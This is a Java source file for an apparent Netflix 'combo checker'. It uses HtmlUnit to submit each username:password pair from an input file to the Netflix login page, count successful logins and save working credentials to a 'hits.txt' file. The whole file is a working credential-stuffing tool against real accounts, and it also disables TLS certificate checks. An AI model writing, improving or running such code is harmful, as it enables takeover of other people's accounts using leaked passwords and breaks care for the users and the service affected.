import java.awt.Color;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;

import javax.swing.JLabel;

import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlButton;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.gargoylesoftware.htmlunit.html.HtmlPasswordInput;
import com.gargoylesoftware.htmlunit.html.HtmlTextInput;

class netflix{
	
	HtmlPage userPage;
	HtmlPage passPage;
	HtmlPage loginPage;
	WebClient webClient;
	String finalOutput = null;
	
	netflix(){
		webClient = new WebClient();
	}
	
	int isValid(String username, String password) {
		
		java.util.logging.Logger.getLogger("com.gargoylesoftware.htmlunit").setLevel(Level.OFF);
		webClient.getOptions().setJavaScriptEnabled(false);
	    webClient.getCookieManager().setCookiesEnabled(true);
	    webClient.getOptions().setCssEnabled(false);
	    webClient.getOptions().setUseInsecureSSL(true);
	    webClient.getOptions().setThrowExceptionOnFailingStatusCode(false);

		try {
			System.out.println("Opening page");
			HtmlPage page = webClient.getPage("https://www.netflix.com/in/login");            
			System.out.println("Opened page");
			System.out.println("Searching for mail");
	        HtmlTextInput email = (HtmlTextInput)page.getElementById("id_userLoginId");
	        System.out.println("Filling Email");
	        email.setValueAttribute(username);
	        System.out.println("Filled Username");
	        HtmlPasswordInput passwd = (HtmlPasswordInput)page.getElementById("id_password");
	        System.out.println("Filling password");
	        passwd.setValueAttribute(password);
	        System.out.println("Filled password");
	        HtmlButton signIn = (HtmlButton) page.getElementsByTagName("button").get(1);
	        System.out.println("Found signIn button");
	        HtmlPage pageSucces = (HtmlPage)signIn.click();
	        System.out.println(pageSucces.getUrl());
	        finalOutput = (String) pageSucces.getUrl().toString();
	        if( finalOutput.contains("browse") ) {
	        	return 1;
	        }
	        else
	        	return 2;
		   }
		catch(Exception e){
			return 3;
		}
	}
	
}


public class netflixLoginCheck {
	
	FileReader reader = null;
	FileWriter writer = null;
	String data = "";
	String input;
	int index;
	String[] combos; 
	String[] single_combo; 
	int validCount;
	boolean noInternet;
	int totalCount;
	int response;
	JLabel label;
	
	netflixLoginCheck(String inputFile, JLabel label){
		this.input = inputFile;
		this.label = label;
		this.validCount = 0;
		this.totalCount = 0;
		this.noInternet = true;
	}
	
	public void doCheck(JLabel label) throws IOException {
		netflix logCheck = new netflix();
		
		try {
			reader = new FileReader(this.input);
			 while((index=reader.read())!=-1){
				 data += (char)index;
			 }
		} catch (FileNotFoundException e) {
			label.setForeground(Color.RED);
			label.setText("File not found");
		}
		
		writer = new FileWriter("hits.txt");
		
		combos = data.split("\n");
		try {
			for(String combo : combos) {
				single_combo = combo.split(":");
				response = logCheck.isValid(single_combo[0],single_combo[1]);
				if(response == 1) {
					this.validCount++;
					writer.write(single_combo[0]+":"+single_combo[1]+"\n");
				}
				else if(response == 2) {
					System.out.println("Account Not Valid");
				}
				else {
					noInternet = true;
					}
				totalCount++;
				label.setText("Total Hits : "+validCount+"\nTotal combos Chekced "+totalCount + "\nTotal Combos Found : "+combos.length);
			}
			if(noInternet) {
				label.setForeground(Color.RED);
				label.setText("Check Internet Connection");
			}else {
			label.setForeground(Color.GREEN);
			label.setText("Process Completed, all hits can be found in hits.txt file.");
			}	
		} catch (Exception e) {}
		finally {
			writer.close();
		}
	}

}
